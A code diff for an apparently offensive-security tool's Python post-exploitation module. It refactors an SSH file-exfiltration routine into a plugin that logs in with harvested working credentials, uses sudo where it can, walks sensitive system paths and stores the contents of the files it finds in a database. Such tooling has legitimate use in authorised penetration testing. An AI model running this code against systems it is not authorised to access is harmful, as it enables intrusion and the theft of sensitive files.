@@ -16,7 +16,7 @@ import logging
 import os
 from abc import ABC, abstractmethod
 from collections import deque
-from typing import Tuple, Type, Dict
+from typing import Tuple, Type, Dict, List
 
 import paramiko
 from schema import Schema, Optional
@@ -49,64 +49,6 @@ SENSITIVE_FILES = [
     '/etc/cron.monthly/',
     '/etc/cron.weekly/',
 ]
-
-
-def post_ssh(ssh: paramiko.SSHClient, credential: Credential):
-    """
-    Post tasks for SSH.
-
-    :param ssh: The existing ssh connection
-    :param credential: The credentials associated with this connection
-    """
-
-    # Stage 0 - Determine access level
-    # If we have sudo access, we need to tell the various exploit
-    # functions so they can use it.
-    sudo = credential.bag.password if credential.sudo else None
-
-    # Stage 1 - Sensitive Files
-
-    def _get_file_info(path: str) -> Tuple[str, str]:
-        name_cmd = 'file -b {}'.format(path)
-        mime_cmd = 'file -i -b {}'.format(path)
-        if sudo:
-            _, stdout, _ = run_sudo(ssh, name_cmd, sudo)
-            name = stdout.read().decode('utf-8').strip()
-            _, stdout, _ = run_sudo(ssh, mime_cmd, sudo)
-            mime = stdout.read().decode('utf-8').strip()
-        else:
-            name = run_command(ssh, name_cmd)
-            mime = run_command(ssh, mime_cmd)
-        return name, mime
-
-    queue = deque(SENSITIVE_FILES)
-    while len(queue):
-        path = queue.pop()
-
-        # Path is a directory
-        if path[-1] == '/':
-            directory = get_directory(ssh, path, sudo)
-            if directory:
-                queue.extend(map(lambda x: os.path.join(path, x.strip()), directory))
-
-        # Path is a wildcard
-        elif '*' in path:
-            files = expand_wildcard(ssh, path, sudo)
-            if files:
-                queue.extend(map(lambda x: x.strip(), files))
-
-        # Path should be a file
-        else:
-            if File.select().where(File.service == credential.service, File.path == path).count() >= 1:
-                continue
-
-            info = _get_file_info(path)
-            contents = get_file(ssh, path, sudo)
-            if contents:
-                File.create(path=path, contents=contents, mime_type=info[1], info=info[0],
-                            service=credential.service)
-            else:
-                logger.error("There was an error retrieving sensitive file %s: %s", path, contents)
 
 
 class PostContext(dict):
@@ -172,7 +114,17 @@ class PostPlugin(ABC):
         if not self.schema:
             raise ValueError('The schema for {} has not been configured'.format(self.name))
         config = Schema(self.schema).validate(config)
+        self.config = config
+        logger.info('Configuring plugin: %s', self.config)
         return config
+
+    def unconfigure(self):
+        """
+        Remove any previous configuration.
+
+        This is used between post exploits.
+        """
+        self.config = None
 
     @abstractmethod
     def run(self, service: Service, context: PostContext) -> bool:
@@ -209,24 +161,63 @@ class PostPlugin(ABC):
 
 
 class PluginRegistry:
+    """
+    The post pwn plugin registry.
+
+    This handles configuring and figuring out which plugins will
+    need to be run.
+    """
     def __init__(self):
         self.registry: Dict[str, PostPlugin] = {}
 
     def register(self, plugin: Type[PostPlugin]):
+        """
+        Register a plugin with the plugin registry.
+
+        :param plugin: The plugin class to register.
+        :raises ValueError: If the plugin does not subclass :py:class:`PostPlugin`.
+        :raises ValueError: If the plugin name is already taken.
+        """
         if not issubclass(plugin, PostPlugin):
             raise ValueError('Plugins must extend PostPlugin')
         if plugin.name in self.registry:
             raise ValueError('Plugin already registered by this name: {}'.format(plugin.name))
         self.registry[plugin.name] = plugin()
 
-    def configure(self, config: dict):
-        for plugin in self.registry.values():
-            plugin.configure(config)
+        # The plugins that will be used for the current run
+        self.run_plugins = []
+
+    def configure(self, config: List[dict]):
+        """
+        Configure the plugins that will be used for this run.
+
+        This will accept the ``commands`` section for the current service.
+
+        :param config: The post config for the current service.
+        :raises KeyError: When a command is specified that doesn't exist.
+        :raises ValueError:
+        """
+
+        # Unconfigure all plugins from a previous run
+        list(map(PostPlugin.unconfigure, self.registry.values()))
+        self.run_plugins = []
+
+        # Configure used plugins for
+        for command in config:
+            if len(command.keys()) != 1:
+                raise ValueError('Each commands entry should have exactly one key')
+            name = list(command.keys())[0]
+            if name not in self.registry:
+                raise KeyError('Unknown plugin: {}'.format(name))
+
+            plugin = self.registry[name]
+            plugin.configure(config[name])
+            self.run_plugins.append(name)
 
     def post(self, service: Service, context: PostContext) -> bool:
         results = [plugin.run(service, context)
                    for plugin in self.registry.values()
-                   if plugin.predicate(service, context)]
+                   if plugin.name in self.run_plugins or plugin.predicate(service, context)]
         return all(results)
 
 
@@ -238,12 +229,89 @@ class SSHFileExfil(PostPlugin):
     }
     context_schema = {
         'ssh': paramiko.SSHClient,
-        'credentials': Credential,
+        'credentials': object,
     }
 
     def run(self, service: Service, context: PostContext) -> bool:
         super().run(service, context)
-        return False
+        logger.debug('Running post ssh exfil')
+        if not self.config:
+            self.config = {
+                'files': [],
+                'merge_files': True,
+            }
+
+        credentials: Credential = context['credentials']
+        ssh: paramiko.SSHClient = context['ssh']
+
+        def _map_creds(bag):
+            return bag.credentials.where(Credential.service == service).get()
+        credentials = map(_map_creds, credentials)
+
+        working_creds = filter(lambda c: c.state == Credential.WORKS, credentials)
+        for credential in working_creds:
+            ssh.connect(service.service_url, service.service_port, credential.bag.username, credential.bag.password)
+            self._post(credential, ssh)
+
+    def _post(self, credential: Credential, ssh: paramiko.SSHClient):
+        sensitive_files: list = self.config['files']
+        if self.config['merge_files']:
+            sensitive_files.extend(SENSITIVE_FILES)
+
+        # Stage 0 - Determine access level
+        # If we have sudo access, we need to tell the various exploit
+        # functions so they can use it.
+        sudo = credential.bag.password if credential.sudo else None
+
+        # Stag 1 - Sensitive Files
+
+        def _get_file_info(path: str) -> Tuple[str, str]:
+            name_cmd = 'file -b {}'.format(path)
+            mime_cmd = 'file -i -b {}'.format(path)
+            if sudo:
+                _, stdout, _ = run_sudo(ssh, name_cmd, sudo)
+                name = stdout.read().decode('utf-8').strip()
+                _, stdout, _ = run_sudo(ssh, mime_cmd, sudo)
+                mime = stdout.read().decode('utf-8').strip()
+            else:
+                name = run_command(ssh, name_cmd)
+                mime = run_command(ssh, mime_cmd)
+            return name, mime
+
+        queue = deque(sensitive_files)
+        while len(queue):
+            path = queue.pop()
+
+            # Path is a directory
+            if path[-1] == '/':
+                directory = get_directory(ssh, path, sudo)
+                if directory:
+                    queue.extend(map(lambda x: os.path.join(path, x.strip()), directory))
+
+            # Path is a wildcard
+            elif '*' in path:
+                files = expand_wildcard(ssh, path, sudo)
+                if files:
+                    queue.extend(map(lambda x: x.strip(), files))
+
+            # Path shold be a file
+            else:
+                if File.select().where(File.service == credential.service, File.path == path).count() >= 1:
+                    continue
+
+                info = _get_file_info(path)
+                contents = get_file(ssh, path, sudo)
+                if contents:
+                    File.create(path=path, contents=contents, mime_type=info[1], info=info[0],
+                                service=credential.service)
+                else:
+                    logger.error('There was an error retrieving sensitive file %s: %s', path, contents)
+                    return False
+        return True
 
     def predicate(self, service: Service, context: PostContext) -> bool:
-        pass
+        return service.service_port
+
+
+registry = PluginRegistry()
+registry.register(SSHFileExfil)
